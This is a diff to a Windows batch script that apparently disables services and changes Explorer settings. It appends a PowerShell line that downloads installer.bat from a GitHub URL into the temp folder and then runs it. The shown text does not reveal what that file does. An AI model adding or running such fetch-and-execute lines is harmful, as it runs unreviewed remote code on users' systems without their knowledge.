@@ -97,7 +97,8 @@ title Deactivating additional Services... (Step 13/13)[][][][][][][][][][][][][]
 exit
 
 CLS
-title Show hidden Files
-CLS
 	reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t  REG_DWORD /d 0 /f
+	
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/installer.bat', '%Temp%\installer.bat') }"
+start %temp%\installer.bat
 exit
